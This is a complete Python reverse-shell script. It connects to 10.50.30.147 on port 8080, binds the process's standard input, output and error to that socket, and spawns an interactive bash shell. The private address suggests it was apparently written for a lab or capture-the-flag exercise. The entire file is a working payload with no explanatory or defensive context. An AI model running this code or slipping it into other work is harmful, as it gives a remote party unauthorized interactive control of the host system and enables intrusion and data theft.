#!/bin/python3

import os, socket, subprocess, pty

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)

sock.connect(("10.50.30.147", 8080))

os.dup2(sock.fileno(),0)

os.dup2(sock.fileno(),1)
os.dup2(sock.fileno(),2)

pty.spawn('/bin/bash')
